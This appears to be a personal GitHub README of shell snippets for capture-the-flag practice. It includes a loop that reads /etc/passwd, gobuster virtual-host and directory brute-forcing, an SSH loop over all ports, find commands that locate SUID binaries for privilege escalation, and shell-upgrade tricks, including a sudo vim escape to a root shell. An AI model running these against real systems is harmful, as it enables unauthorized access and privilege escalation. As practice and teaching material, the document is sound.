# Some useful shell scripts
I upload some useful shell scipts here now and then.

### **Clone the repository**
```bash
git clone https://github.com/century300/useful-shell-scripts ~/Downloads/useful-shell-scripts && cd ~/Downloads/useful-shell-scripts && chmod +x *
```
<br/>

### **read_etc-passwd_file.sh**
- This script read the /etc/passwd file and output each user shell and directory
```bash
./read_etc-passwd_file.sh
```
- Or you can run the code in terminal
```bash
while IFS=: read -r f1 f2 f3 f4 f5 f6 f7
do
 echo "User $f1 use $f7 shell and stores files in $f6 directory."
done < /etc/passwd
```
<br/>

### **Bash for loop**
- for loop syntax
```bash
for OUTPUT in $(Linux-Or-Unix-Command-Here)
do
	command1 on $OUTPUT
	command2 on $OUTPUT
	commandN
done
```
- Usage 1: gobuster brute-force using SecLists subdomains wordlist to discover virtual hosts names, then use **_for loop_** and dirbuster wordlist to find the _flag_ in there
```bash
gobuster vhost -u http://TargetWebsite.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t30

for vhost in subDomain1 subDomain2 subDomain3; do gobuster dir -u http://${vhost}.TargetWebsite.com -w /usr/share/dirbuster/directory-list-2.3-small.txt -x php,txt -t30 -o Output.txt; done
```
- Usage 2: **ssh_spam.sh**: check to see which one is the useful ssh port in CTF
```bash
for port in {1..65535}
do
	printf "$port"
	ssh -o StrictHostKeyChecking=no -p $port <target_IP>
done
```
<br/>

### **Privilege escalation by using SUID**
- **-u=s** denotes files owned by the root user, **2>/dev/null** means to redirect all errors to /dev/null (aka ignoring all errors)
```bash
# Find SUID executables
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null

# Find SUID
find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```
<br/>

### **Reverse Shell Tricks**
```bash
# Get a tty shell
python -c 'import pty; pty.spawn("/bin/sh")'

# Upgrade shell to a tty
SHELL=/bin/bash script -q /dev/null

# Set terminal
export TERM=xterm-256color

#Switch to the background with CTRL+Z

# If sudo -l in user has access to /usr/bin/vim
sudo vim -c ":!/bin/sh"
```
<br/>
